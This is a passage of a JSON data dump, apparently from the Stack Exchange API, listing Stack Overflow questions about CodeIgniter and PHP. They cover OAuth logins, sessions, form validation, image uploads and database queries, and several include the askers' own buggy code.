rel=\"nofollow\">oauth2 spark</a> I'm getting back from Google an OAuth token similar to below:</p>\n\n<pre><code>OAuth2_Token_Access Object\n (\n   [access_token:protected] =&gt; dp83.AHSDj899sDHHD908DHFBDjidkd8989dDHhjjd\n   [expires:protected] =&gt; 1349816820\n   [refresh_token:protected] =&gt; \n   [uid:protected] =&gt; \n )\n</code></pre>\n\n<p>And using that token I can retrieve some user info from Google:</p>\n\n<pre><code>[uid] =&gt; 3849450385394595\n[nickname] =&gt; this_guy\n[name] =&gt; This Guy\n[first_name] =&gt; This\n[last_name] =&gt; Guy\n[email] =&gt; this.guy@example.com\n[location] =&gt; \n[image] =&gt; \n[description] =&gt; \n[urls] =&gt; Array\n    (\n    )\n</code></pre>\n\n<p>Now to allow the 15 people or so who will be using the webapp currently to log in, do I need to create a <code>users</code> table in the mysql database with their email address as a key? Then compare the email which just came back from the Google OAuth request and see if it exists in my <code>users</code> table?</p>\n\n<p>What about the Google access_token, do I store that now along with the email which already existed in the users table? </p>\n\n<p>Related: How would I go about verifying the user automatically in the future against that access_token so they don't have to go through the whole OAuth approval process with Google again?</p>\n"},{"tags":["php","facebook","codeigniter","session"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":89,"score":2,"question_id":12325197,"title":"Facebook Connect Log Out","body":"<p>I am developing a Php based application with CodeIgniter using Facebook Connect SDK for php. So far all users are able to log in into the system but for some when they try to log out the session would not expire! This is really odd since this would work for some users and not work for the others! \nFollowing is the basic logout code that I use that Facebook provided: \ncontroller: </p>\n\n<pre><code>if ($user) {\n            $data['logoutUrl'] = $this-&gt;facebook-&gt;getLogoutUrl();\n</code></pre>\n\n<p>View:</p>\n\n<pre><code>&lt;a href=\"&lt;?php echo $logoutUrl; ?&gt;\" id=\"bstyle\" onclick=\"RemoveSess()\"&gt;Logout&lt;/a&gt;\n</code></pre>\n\n<p>JavaScript: </p>\n\n<pre><code>function RemoveSess(){\n                $.post(\"&lt;?php echo base_url(); ?&gt;\"+ \"/facebook_cn/remSess\", function(data){\n                        document.getElementById('message').innerHTML = $data;       \n                      });   \n            }\n</code></pre>\n\n<p>Php Controller:</p>\n\n<pre><code>function remSess()\n{\n    $data2 = array('user_id' =&gt; '','logged_in' =&gt; '');\n    $this-&gt;session-&gt;unset_userdata($data2);\n    $this-&gt;session-&gt;sess_destroy();\n    session_destroy();\n    $data = array('sess' =&gt; \"gone\" );\n    echo json_encode($data[\"sess\"]=\"gone\");\n}\n</code></pre>\n"},{"tags":["php","codeigniter","twitter-api","twitter-oauth"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":69,"score":0,"question_id":12568769,"title":"\"Register With Twitter\" Button - How to","body":"<p>I have just recently created a \"Register With Facebook\" button for our website, and I am attempting to achieve the same thing with Twitter.</p>\n\n<p>However I am having difficulty finding precise step by step instructions for accomplishing the task with Twitter.</p>\n\n<p>What I did with Facebook was:</p>\n\n<pre><code>// (1) - Create new Facebook object:\n$facebook = new Facebook(array( \n    'appId'  =&gt; $this-&gt;config-&gt;item('facebook_app_id'),  \n    'secret' =&gt; $this-&gt;config-&gt;item('facebook_app_secret')\n));\n\n// (2) - Get all fields relating to logged-in user:\n$facebook_user = $facebook-&gt;getUser();\n\n// (3) - Retrieve all fields which we need to register a user on OUR website:\nif ($facebook_user){//if logged in to Facebook:\n    $facebook_user_profile = $facebook-&gt;api('/me');\n    $fb_email        = $facebook_user_profile[\"email\"];\n    $fb_first_name   = $facebook_user_profile[\"first_name\"];\n    $fb_last_name    = $facebook_user_profile[\"last_name\"];\n    // ...\n}\n</code></pre>\n\n<p>QUESTION 1:</p>\n\n<p>How do I achieve the same thing with Twitter?</p>\n\n<p>QUESTION 2:</p>\n\n<p>I have created an app (https://dev.twitter.com/apps/new)  and now have the 4 codes (Consumer key, Consumer secret, Access token, Access token secret), I have no idea what these codes are, but do I need these 4 codes for the task at hand?</p>\n\n<p>Any suggestions or online resources would be great...</p>\n"},{"tags":["php","mysql","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":22,"score":1,"question_id":12806353,"title":"HeUpdating the config items with codeigniter?","body":"<p>the question I have is it possible to edit the config values in a custom config file within codeigniter?</p>\n\n<p>I understand that </p>\n\n<pre><code>$this-&gt;config-&gt;set_item('item_name', 'item_value');\n</code></pre>\n\n<p>Would set a certain config item to a certain value, however would this change be permanent? If I have an admin config file for a website and want to allow the user to edit certain values that would need to be changed forever, or until the user changes them again.</p>\n\n<p>Or am I better off storing the settings in a database and then fetching them?</p>\n\n<p>Thank you.</p>\n"},{"tags":["codeigniter","google-api","oauth-2.0","sso","saml"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":77,"score":0,"question_id":12804728,"title":"CodeIgniter web application SSO, use OAuth2? SAML? Both/Neither?","body":"<p>I have a CodeIgniter 2.1 internal web app which uses a simple shared password (no usernames) for authentication. It's time to pull that out and ideally use Single Sign On with our company Google Apps accounts to authenticate specific internal users, and in the future allow external users to authenticate with their Google/Twitter/Facebook accounts.</p>\n\n<p>So the question is, where should I start to achieve what I'm looking for above?</p>\n\n<ul>\n<li><a href=\"https://developers.google.com/google-apps/sso/saml_reference_implementation\" rel=\"nofollow\">Google SAML SSO for Google Apps?</a></li>\n<li><a href=\"http://getsparks.org/packages/oauth2/versions/HEAD/show\" rel=\"nofollow\">CodeIgniter OAuth 2.0 library?</a></li>\n<li>Something else?</li>\n</ul>\n\n<p>I take it I need to still maintain a database of user_ids and emails for who is allowed to use the web app, even though Google or someone else will be verifying their identity? </p>\n\n<p>Mine seems like a fairly basic use case but I've been lost in a sea of acronyms on this one</p>\n"},{"tags":["database","codeigniter","activerecord"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":55,"score":2,"question_id":12804389,"title":"Codeigniter ActiveRecord not returning any results for particular tableUn","body":"<p>Having a problem with returning results from one particular table in a database.</p>\n\n<p>I have two tables:</p>\n\n<pre><code>a) repository_notes\nb) repository_noteupdates (this one is giving the problem)\n</code></pre>\n\n<p>Here is an image showing there are some data in both tables using a simple select * query using Navicat.</p>\n\n<p><img src=\"http://i.stack.imgur.com/BKTMa.jpg\" alt=\"enter image description here\">\n<a href=\"http://imgur.com/GA6bn\" rel=\"nofollow\">http://imgur.com/GA6bn</a></p>\n\n<p>However When I query repository_notes below:</p>\n\n<pre><code>print_r($this-&gt;db-&gt;get('repository_notes')-&gt;result_array()); \n</code></pre>\n\n<p>It gives me the following result set:</p>\n\n<pre><code>Array\n(\n[0] =&gt; Array\n    (\n        [note_id] =&gt; 1\n        [note_title] =&gt; This is my note\n        [note_content] =&gt; Lorem ipsum dolor sit amet, consectetur adipiscing elit. In laoreet lobortis lacus, ac iaculis risus tristique nec. Curabitur porta gravida est, non tincidunt nunc porta nec. Nunc diam metus, feugiat non lobortis\n        [note_userId] =&gt; 2302\n        [note_pageno] =&gt; 12\n        [note_deleted] =&gt; 0\n        [note_bookid] =&gt; 12\n    )\n\n[1] =&gt; Array\n    (\n        [note_id] =&gt; 2\n        [note_title] =&gt; This is my note\n        [note_content] =&gt; Lorem ipsum dolor sit amet, consectetur adipiscing elit. In laoreet lobortis lacus, ac iaculis risus tristique nec. Curabitur porta gravida est, non tincidunt nunc porta nec. Nunc diam metus, feugiat non lobortis\n        [note_userId] =&gt; 2302\n        [note_pageno] =&gt; 12\n        [note_deleted] =&gt; 0\n        [note_bookid] =&gt; 12\n    )\n</code></pre>\n\n<p>However when I run the query below:</p>\n\n<p>print_r($this->db->get('repository_noteupdates')->result_array()); </p>\n\n<p>I get no results:</p>\n\n<pre><code> Array\n    (\n    ) \n</code></pre>\n\n<p>Have any of you seen anything like this before and have a solution it would be appreciated.</p>\n"},{"tags":["php","codeigniter","codeigniter-2"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":12805331,"title":"From multiple images selected for upload wrong image gets thumbnailed","body":"<p>Have a form here with bunch of input <strong>text</strong> fields and a <strong>file upload</strong> input that can only accept <strong>multiple images</strong>.</p>\n\n<p><strong>What needs to happen:</strong></p>\n\n<p>After selecting a bunch of images and clicking <strong>Submit</strong> button - the controller should insert the text data into one table, then upload all the images and add their file names to the <strong>images</strong> table with foreign_key linking to the text data that was inserted, and finally make the first image, that was selected, turned into a thumbnail and upload its name and foreign_key linking to the text data row into <strong>thumbnails</strong> table too.</p>\n\n<p><strong>What happens:</strong></p>\n\n<p>Images+thumbnail get uploaded properly(or put into the upload folder without any duplicates and etc.), but for some reason the <strong>last</strong> image that was selected gets thumbnailed, not the first one.</p>\n\n<p>Also, although only <strong>one</strong> image is thumbnailed - the database ends up adding name of every image, that were selected/uploaded, to the thumbnails table with <code>_thumb</code> in their names.</p>\n\n<p><strong>crud.php</strong> <em>(controller)</em></p>\n\n<pre><code>function add()\n        {\n            //Set validation properties\n            $this-&gt;_set_fields();\n\n            //Set common properties\n            $data['title'] = 'Add new data row';\n            $data['message'] = '';\n            $data['action'] = site_url('crud/addDataRow');\n            $data['link_back'] = anchor('crud/index', 'Back to list', array('class' =&gt; 'back'));\n\n            //Load the view\n            $this-&gt;load-&gt;view('templates/header', $data);\n            $this-&gt;load-&gt;view('pages/crud_edit', $data);\n            $this-&gt;load-&gt;view('templates/footer');\n        }\n\n        function addDataRow()\n        {\n            //Set common properties\n            $data['title'] = 'Add new data row';\n            $data['action'] = site_url('crud/addDataRow');\n            $data['link_back'] = anchor('crud/index/', 'Back to list', array('class' =&gt; 'back'));\n\n            //Set validation properties\n            $this-&gt;_set_fields();\n            $this-&gt;_set_rules();\n\n            //Run validation\n            if($this-&gt;form_validation-&gt;run() == FALSE)\n            {\n                $data['message'] = '';\n            }\n            else\n            {\n                //Get the text data from $_POST\n                $data_row = array(\n                    'title' =&gt; $this-&gt;input-&gt;post('title'),\n                    'text' =&gt; $this-&gt;input-&gt;post('text'),\n                    'price' =&gt; $this-&gt;input-&gt;post('price'),\n                    'status' =&gt; $this-&gt;input-&gt;post('status'),\n                    'type' =&gt; $this-&gt;input-&gt;post('type')\n                );\n\n                //Insert text data into table\n                $id = $this-&gt;crud_model-&gt;save($data_row);\n\n                //Now move on to image processing\n                //original image upload settings\n                $config['allowed_types'] = 'gif|jpg|png';\n                $config['max_size'] = '6000';\n                $config['max_width']  = '1680';\n                $config['max_height']  = '1050';\n                $path_to_uploads= './assets/upload';\n                $config['upload_path'] = $path_to_uploads;\n                $this-&gt;load-&gt;library('upload', $config);\n\n                $arr_files = @$_FILES['images'];\n\n                $_FILES = array();\n                foreach(array_keys($arr_files['name']) as $h){\n                    $_FILES[\"file_{$h}\"] = array(\n                        'name' =&gt; $arr_files['name'][$h],\n                        'type' =&gt; $arr_files['type'][$h],\n                        'tmp_name' =&gt; $arr_files['tmp_name'][$h],\n                        'error' =&gt; $arr_files['error'][$h],\n                        'size' =&gt; $arr_files['size'][$h]\n                    );\n                }\n\n                //add this\n                $this-&gt;upload-&gt;initialize($config);\n\n                foreach(array_keys($_FILES) as $h) {\n\n                    if (!$this-&gt;upload-&gt;do_upload($h)){\n                        $error = $this-&gt;upload-&gt;display_errors();\n                        //echo \"&lt;script&gt;alert($error);&lt;/script&gt;\";\n                        print($error); die;\n                    }else{\n\n                        $upload_data=$this-&gt;upload-&gt;data();\n                        $file_name=$upload_data['file_name'];\n                        $full_file_path = $path_to_uploads.'/'.$file_name;\n\n                        $image_row = array(\n                        'id_path' =&gt; $file_name,\n                        'id_data_row' =&gt; $id\n                        );\n\n                        //Upload original image\n                        $this-&gt;crud_model-&gt;save_image($image_row);\n\n                        if(current($_FILES) == $_FILES['file_0']){\n                            //Thumbnail config\n                            $config['image_library'] = 'gd2';\n                            $config['source_image'] = $full_file_path;\n                            $config['create_thumb'] = TRUE;\n                            $config['maintain_ratio'] = TRUE;\n                            $config['width'] = 150;\n                            $config['height'] = 150;\n\n                            $this-&gt;load-&gt;library('image_lib', $config);\n\n                            $this-&gt;image_lib-&gt;resize();\n\n                            $thumbnail_row = array(\n                            'id_path' =&gt; str_replace(\".\", \"_thumb.\", $file_name),\n                            'id_data_row' =&gt; $id\n                            );\n\n                            $this-&gt;crud_model-&gt;save_thumbnail($thumbnail_row);\n                        }       \n                    }\n                }\n                //Set form input name=\"id\"\n                $this-&gt;form_validation-&gt;id = $id;\n\n                //Set user message\n                $data['message'] = '&lt;div class=\"success\"&gt;New data row added!&lt;/div&gt;';\n            }\n\n            $this-&gt;load-&gt;view('templates/header', $data);\n            $this-&gt;load-&gt;view('pages/crud_edit', $data);\n            $this-&gt;load-&gt;view('templates/footer');\n        }\n</code></pre>\n\n<p><strong>crud_model.php</strong> <em>(model)</em></p>\n\n<pre><code>//Add new data row\n        function save($data)\n        {\n\n            $this-&gt;db-&gt;insert($this-&gt;tbl_data, $data);\n            return $this-&gt;db-&gt;insert_id();\n        }\n\n        //Add the original image\n        function save_image($data)\n        {\n            $this-&gt;db-&gt;insert($this-&gt;tbl_images, $data);\n            return $this-&gt;db-&gt;insert_id();\n        }\n\n        //Add the thumbnail upload path and id of the row in data table to link them\n        function save_thumbnail($data)\n        {\n            $this-&gt;db-&gt;insert($this-&gt;tbl_thumbnails, $data);\n            return $this-&gt;db-&gt;insert_id();\n        }\n</code></pre>\n"},{"tags":["php","codeigniter","postgresql","postgresql-9.1","appfog"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":67,"score":1,"question_id":12792024,"title":"CodeIgniter website with PostgreSql database in APPFOG","body":"<p>I am running a website in Codeigniter framework. I am using postgresql. I went through APPFOG documentation. But it is not clear to me how I configure postgres database . Where do I host the database? How do I make database updates? </p>\n"},{"tags":["php","codeigniter","mysqli"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":12805525,"title":"Need help looping through query result","body":"<h1>Model</h1>\n\n<pre><code>    $data   =   array();\n    $session_id = $this-&gt;session-&gt;userdata('id'); \n\n    $q = $this-&gt;db-&gt;get_where('cust_orders', array('cust_id' =&gt; $id));\n\n\n        foreach ($q-&gt;result() as $row)\n        {\n            $data['id'] = $row-&gt;cust_id; \n            $data['orders'] = $row-&gt;cart; \n\n        }\n            return $data;\n</code></pre>\n\n<h1>Controller</h1>\n\n<p>Passes the <code>data</code> to the view</p>\n\n<h1>View</h1>\n\n<pre><code>&lt;?php foreach($_orders as $key =&gt; $item) : ?&gt;\n&lt;tr&gt;\n\n    &lt;td&gt;\n    &lt;?php \n        $price = $item['price']; #change this to order status \n\n        switch ($price) \n        {\n        case (64); $UPSTrack = '1Z12345E1512345676'; #Shipped add tracking number\n              echo 'Shipped &lt;br&gt; &lt;a href=\"http://wwwapps.ups.com/WebTracking/track?track=yes&amp;trackNums='.$UPSTrack.'\"&gt;Track My Order&lt;/a&gt;'; \n              break;\n\n        case (88);\n              echo 'Shipped'; \n              break;\n\n        default;\n              echo 'Processing'; \n              break;\n        }\n    ?&gt;\n\n    &lt;/td&gt;\n\n\n\n\n    &lt;td&gt;\n    &lt;?php foreach ($item['options'] as $option =&gt; $value) \n            {\n            echo '&lt;span class=\"option\"&gt;'.$option . ': &lt;/span&gt; &lt;span class=\"options\"&gt;' . $value . '&lt;/span&gt;';\n            } \n    ?&gt;\n    &lt;/td&gt;\n\n\n    &lt;td&gt;&lt;?php echo $item['id']; ?&gt;&lt;/td&gt;\n\n    &lt;td&gt;&lt;?php echo $item['qty'];  ?&gt;&lt;/td&gt;\n\n    &lt;td&gt;&lt;?php echo number_format($item['price'],2); ?&gt;&lt;/td&gt;\n\n&lt;/tr&gt;    \n\n\n\n&lt;?php endforeach; ?&gt;\n</code></pre>\n\n<p><strong>Options is an ARRAY</strong></p>\n\n<p>Contains a <code>foreach</code> which loops through the <code>array</code> contained in the variable <code>$data['orders'] = $row-&gt;cart;</code> </p>\n\n<p>In the database I am looking up the <code>cust_orders</code> table by <code>cust_id</code> A customer may have more than <code>1</code> row meaning multiple orders.</p>\n\n<p>The problem is that I am only looping through the last row. I need to loop through all rows where <code>cust_id</code> is = to <code>$session_id</code>.</p>\n\n<p>I feel the problem is in my <code>MODEL</code> because if I change  <code>$data['id'] = $row-&gt;cust_id;</code> to  <code>echo $row-&gt;cust_id;' I am able to see all of the rows which match the customers id, but it breaks my</code>foreach` code.</p>\n\n<p>How do I properly assign the <code>values</code> returned in the <code>MODEL</code> query so that all cust_orders == to <code>$session_id</code> are displayed?    </p>\n"},{"tags":["codeigniter","error-handling","form-validation"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":12805163,"title":"How do get form_validation to work properly in Code Igniter","body":"<p>I am really close to giving up on the native form validation error functions in Code Igniter as I am having great trouble getting them to work properly. My logic seems straight as an arrow, however the behavior of the error posing is really throwing me for a loop based off of my logic.</p>\n\n<p>so here is a list of what is going on.</p>\n\n<p>*When I submit the form without filling out any fields = the invalid email and password errors pose as they should</p>\n\n<p>*When I enter the CORRECT email and leave password field blank = the proper invalid password error poses as it should</p>\n\n<p>*When I enter the correct email and an incorrect password = the page loads white</p>\n\n<p>*When I enter just the password field = the invalid email comes up</p>\n\n<p>*When I enter gibberish email and leave password blank = invalid email comes up</p>\n\n<p>There are many combinations of false hood that are going on. </p>\n\n<p>I am also wanting to make the emails unique to where it recognizes if the email being entered does not exist in the database.</p>\n\n<p>I have been stuck on this for far too long and really need some help. I am new with code-igniter and am really confused as to why this is happening. Any help is greatly appreciated.</p>\n\n<p>Here is my code:</p>\n\n<p>Form:</p>\n\n<pre><code>&lt;?php\necho form_open('auth/validate_credentials_login');\necho \"&lt;span class='errors_login'&gt;\";\necho form_error('email_login');\necho \"&lt;/span&gt;\";\necho form_label('', 'Email', 'email_login');\n$data = array( 'name' =&gt; 'email_login', 'class' =&gt; 'input', 'placeholder' =&gt; 'Email');\necho form_input($data, set_value('email_login'));\necho \"&lt;span class='errors_login'&gt;\";\necho form_error('password_login');\necho \"&lt;/span&gt;\";\necho form_label('', 'Password;', 'password_login');\n$data = array( 'name' =&gt; 'password_login', 'class' =&gt; 'input', 'placeholder' =&gt; 'Password');\necho form_password($data, set_value('sha1(password_login)'));\necho form_submit('submit_login', 'Login');\necho form_close();\n?&gt;\n</code></pre>\n\n<p>Controller:</p>\n\n<pre><code>function validate_credentials_login()\n        {\n            $this-&gt;load-&gt;library('session');\n            $this-&gt;load-&gt;helper(array('form','url'));\n            $this-&gt;load-&gt;model('user_model', 'um');\n            $this-&gt;load-&gt;library('encrypt');\n            $this-&gt;load-&gt;library('form_validation');\n            $this-&gt;form_validation-&gt;set_rules('email_login', 'Email', 'required');\n            $this-&gt;form_validation-&gt;set_rules('password_login', 'Password', 'required');\n            $login = $this-&gt;input-&gt;post('submit_login');\n\n            if($login) {\n                if($this-&gt;form_validation-&gt;run() == FALSE)\n                {\n                    $data['main_content'] = 'home/home_page';\n                    $this-&gt;load-&gt;view('includes/templates/home_page_template', $data);\n                }\n                else \n                {\n                    $user = $this-&gt;um-&gt;validate_home_login(array('email' =&gt; $this-&gt;input-&gt;post('email_login')));\n\n                        if($user-&gt;password == $this-&gt;encrypt-&gt;sha1( $user-&gt;salt .           $this-&gt;encrypt-&gt;sha1($this-&gt;input-&gt;post('password_login')))) {\n                            $this-&gt;session-&gt;set_userdata(array(\n                                'email' =&gt; $this-&gt;input-&gt;post('email_login')\n                                    ));\n                                redirect('account/edit');\n                                exit;\n                            }\n                        }\n                    }\n                }\n</code></pre>\n\n<p>thanks in advance!</p>\n"},{"tags":["php","arrays","query","codeigniter","activerecord"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":12804932,"title":"How to query the database with infromation from another query?","body":"<p>I have a mysql table with information about students and another will info about payments. I want to display a table with the student name and payment info. Is my code correct? or am I misunderstanding how it works because this results in an empty array.\nI want it, for every student it found in  $data['students'] to search for the payment info with same studentid be from this year and class id be the same as $id. Is there a simpler way to do this?</p>\n\n<pre><code>    $data['students'] = $this-&gt;db-&gt;get_where('students', array('class_id' =&gt; $id), 40);\n\n    foreach ($data['students']-&gt;result_array() as $student){        \n        $data['student_info'] = $this-&gt;db-&gt;get_where('student_payments', array('class_id' =&gt; $id, 'student_id' =&gt; $student['id'], 'year' =&gt; date(\"Y\")), 40);        \n    }\n</code></pre>\n\n<p>Thanks in advance,</p>\n\n<p>Thaiscorpion.</p>\n"},{"tags":["php","mysql","codeigniter","recordset"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":4,"view_count":69,"score":-4,"question_id":12804525,"title":"How to convert this code into codeigniter code?","body":"<p>It may seem that I ask similar questions. Transition from the conventional work flow in coding to a Framework may takes time to learn. But I don't have all of the time the world could offer me right now.</p>\n\n<p>Question:</p>\n\n<p>how can i convert this code (recordset) to codeigniter code:</p>\n\n<pre><code>$maxRows_notification = 10;\n$pageNum_notification = 0;\nif (isset($_GET['pageNum_notification'])) {\n$pageNum_notification = $_GET['pageNum_notification'];\n}\n$startRow_notification = $pageNum_notification * $maxRows_notification;\n\n$colname_notification = \"-1\";\nif (isset($_GET['inactive'])) {\n$colname_notification = $_GET['inactive'];\n}\nmysql_select_db($database_connection_ched, $connection_ched);\n$query_notification = sprintf(\"SELECT * FROM tb_user WHERE status = 'inactive' ORDER BY date_register ASC\", GetSQLValueString($colname_notification, \"text\"));\n$query_limit_notification = sprintf(\"%s LIMIT %d, %d\", $query_notification, $startRow_notification, $maxRows_notification);\n$notification = mysql_query($query_limit_notification, $connection_ched) or die(mysql_error());\n$row_notification = mysql_fetch_assoc($notification);\n</code></pre>\n\n<p>This recordset displays record from table tb_user with inactive status.</p>\n"}]}
{"total":13987,"page":11,"pagesize":100,"questions":[{"tags":["php","validation","codeigniter","frameworks","form-validation"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":55,"score":0,"question_id":12804218,"title":"Codeigniter Array Field Validation Issue","body":"<p>I need a tip if someone can help...</p>\n\n<p>I am stuck over a validation in Codeigniter. Below is the issue.</p>\n\n<p>A loop with a counter..</p>\n\n<pre><code>&lt;div class=\"&lt;?php if (form_error('shift_from[' . $counter . ']') != \"\") echo \"error\"; ?&gt;\"&gt;\n&lt;label for=\"shift_from[&lt;?php echo $counter; ?&gt;]\"&gt;Shift Start&lt;/label&gt;\n    &lt;select name=\"shift_from[&lt;?php echo $counter; ?&gt;]\"&gt;\n    &lt;/select&gt;                                \n&lt;?php echo form_error('shift_from[' . $counter . ']'); ?&gt;  \n\n&lt;div class=\"&lt;?php if (form_error('shift_to[' . $counter . ']') != \"\") echo \"error\"; ?&gt;\"&gt;\n&lt;label for=\"shift_to[&lt;?php echo $counter; ?&gt;]\"&gt;Shift End&lt;/label&gt;\n    &lt;select name=\"shift_to[&lt;?php echo $counter; ?&gt;]\"&gt;\n    &lt;/select&gt;                                \n&lt;?php echo form_error('shift_to[' . $counter . ']'); ?&gt;  \n</code></pre>\n\n<p>which results in a repetitive HTML as below</p>\n\n<pre><code>&lt;label for=\"shift_from[1]\"&gt;Shift Start&lt;/label&gt;\n&lt;select name=\"shift_from[1]\"&gt;\n &lt;option value=\"\"&gt;&lt;/option&gt;\n &lt;option value=\"\"&gt;&lt;/option&gt;\n &lt;option value=\"\"&gt;&lt;/option&gt;\n&lt;/select&gt;                                \n\n&lt;label for=\"shift_to[1]\"&gt;Shift End&lt;/label&gt;\n&lt;select name=\"shift_to[1]\"&gt;\n &lt;option value=\"\"&gt;&lt;/option&gt;\n &lt;option value=\"\"&gt;&lt;/option&gt;\n &lt;option value=\"\"&gt;&lt;/option&gt;\n&lt;/select&gt;\n</code></pre>\n\n<p>I am setting the rules as</p>\n\n<pre><code>$fromArray = $this-&gt;input-&gt;post('shift_from');                \nfor($i=1;$i&lt;=count($fromArray);$i++){\n    $this-&gt;form_validation-&gt;set_rules('shift_from['.$i.']', 'Shift Start', 'callback_check_shifts');\n    $this-&gt;form_validation-&gt;set_rules('shift_to['.$i.']', 'Shift End', 'callback_check_shifts');\n}\n</code></pre>\n\n<p>and the callback function is as below</p>\n\n<pre><code>public function check_shifts(){\n$fullArray = $this-&gt;input-&gt;post();        \nfor($i=1;$i&lt;=count($fullArray['shift_from']);$i++){\n    if($fullArray['shift_from'][$i] == $fullArray['shift_to'][$i]){                \n $this-&gt;form_validation-&gt;set_message('check_shifts', \"Shift Start and End times cannot be the same.\");\n return FALSE;\n    }   \n}\n</code></pre>\n\n<p>The problem is the when any one or two of the shift timings are same - every select box shows the error (including the ones that are correct too) and not those individual ones.</p>\n\n<p><img src=\"http://i.stack.imgur.com/5MuQg.png\" alt=\"validation error codeigniter array fields\"></p>\n\n<p>Can anyone help?</p>\n"},{"tags":["javascript","codeigniter","session","reset"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":76,"score":0,"question_id":12735456,"title":"CodeIgniter destroying my session without","body":"<p>So, my current task involves a site where people can sign in, and view a series of training videos on a particular topic.  I developed this within CodeIgniter.  The only trouble is that once I have them log in, and I create a session, that session seems to mysteriously disappear after a few minutes, and they're mysteriously bounced back to the login page (which is what happens if someone is on the training video page without being signed in.  This is the block of code in my config.php page:</p>\n\n<pre><code>$config['sess_cookie_name'] = 'cc_session';\n$config['sess_expiration']  = 0;\n$config['sess_expire_on_close'] = FALSE;\n$config['sess_encrypt_cookie']  = FALSE;\n$config['sess_use_database']    = TRUE;\n$config['sess_table_name']  = 'cc_sessions';\n$config['sess_match_ip']    = TRUE;\n$config['sess_match_useragent'] = TRUE;\n$config['sess_time_to_update']  = 3000000;\n</code></pre>\n\n<p>Why is sess_time_to_update set so high?  At first, I thought that was the culprit, updating the session after 5 minutes.  I have set the session to record to a database, and all that good stuff.  Please, ask me questions, and help me get to the bottom of this!</p>\n\n<p>I should point out that I have an iFrame that is on the course page that is sending a \"ping\" back to a server this way... </p>\n\n<pre><code> &lt;iframe id=\"timerAddEnd\" style=\"display:none;\" src=\"http://www.example.com/course/finish/&lt;?=$course-&gt;intKey?&gt;/ping\" &gt;\n &lt;/iframe&gt;\n &lt;script type=\"text/javascript\"&gt;\n      var auto_refresh = setInterval( function () \n      { \n           var iframe = document.getElementById('timerAddEnd'); \n           iframe.src = iframe.src; \n      }, 60000); \n      // refresh every minute \n &lt;/script&gt; \n</code></pre>\n\n<p>Could THIS be the culprit? I was hoping this would be a quick and dirty fix to the initial problem.</p>\n"},{"tags":["php","codeigniter","webforms"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":12801437,"title":"Codeigniter - Form validation callbacks","body":"<p>What is wrong with this code ?\nThe problem is that the is_empty method is called but is_image not.</p>\n\n<pre><code>$this-&gt;load-&gt;library('form_validation');\n$this-&gt;form_validation-&gt;set_rules('userfile', 'image', 'callback_is_empty|callback_is_image');\n</code></pre>\n\n<p>Here is the is_image method </p>\n\n<pre><code>public function is_image()\n{\n  echo 'Hello from is_image';\n}\n</code></pre>\n"},{"tags":["php","codeigniter","view","controller"],"answer_count":3,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":1402,"score":2,"question_id":9446700,"title":"Codeigniter: Passing data from controller to view","body":"<p>I cannot spot my error here. I am wanting to pass <code>$data</code> from the <code>poll</code> controller to the <code>results_view</code> however I am getting an undefined variable error. </p>\n\n<pre><code>&lt;?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');\n\nclass Poll extends CI_Controller {\n\n    public function __construct()\n       {\n            parent::__construct();\n            $this-&gt;load-&gt;database();\n            $this-&gt;load-&gt;helper('form');\n       }\n\n    public function index()\n    {\n\n        $this-&gt;load-&gt;view('poll_view',$data);\n    }\n\n    public function vote()\n    {\n        echo \"Voting Successfull\";\n        $this-&gt;db-&gt;insert('votes',$_POST);\n    }\n\n    public function results()\n    {\n        echo \"These are the results\";\n        //$query = $this-&gt;db-&gt;get('votes');\n        $data = \"hello\";\n        $this-&gt;load-&gt;view('results_view', $data);\n\n    }\n}\n</code></pre>\n\n<p>Results_view.php</p>\n\n<pre><code>&lt;html&gt;\n&lt;?php echo $data; ?&gt;\n&lt;/html&gt;\n</code></pre>\n"},{"tags":["php","html","css","codeigniter","codeigniter-datamapper"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":4,"view_count":113,"score":-2,"question_id":12067325,"title":"Can i use php inside a form element like this?","body":"<p>I'm doing a campaign project in which the admin can reserve some seats using admin panel. When he wants to edit it,previously selected seats should highlight. This is what i've done for achieving this </p>\n\n<pre><code>if ($mode == 'EDIT')\n        {\n            $k=1;\n            for($i=1;$i&lt;=10;$i++)\n            {\n            for($j=1;$j&lt;=10;$j++)\n            { ?&gt;\n                &lt;div id='&lt;?php echo $k ;?&gt;' class=\"seat_selection\"\n                &lt;?php foreach($seat_data as $seats)\n                {\n                if($seats-&gt;iSeatNumber == $k)\n                {?&gt;\n                    style='min-height:25px;min-width:25px;background-color:#12B22F;float:left;margin:0 0 5px 10px;cursor:pointer;'\n                &lt;?php\n                }\n                else\n                {?&gt;\n                    style='min-height:25px;min-width:25px;background-color:#969696;float:left;margin:0 0 5px 10px;cursor:pointer;'\n                &lt;?php\n                }\n                }\n                ?&gt;\n                &gt;\n                &lt;?php echo $k;?&gt;\n                &lt;/div&gt;\n            &lt;?php $k++;\n            } ?&gt;\n            &lt;br /&gt;&lt;br /&gt;\n            &lt;?php\n            }\n        }\n</code></pre>\n\n<p>But only the first seat among the selected seats is being highlighted(like <strong>5th seat</strong> as shown in screenshot). Rest remains unchanged. </p>\n\n<p><strong>Screenshot</strong>\n<img src=\"http://i.stack.imgur.com/QSttz.png\" 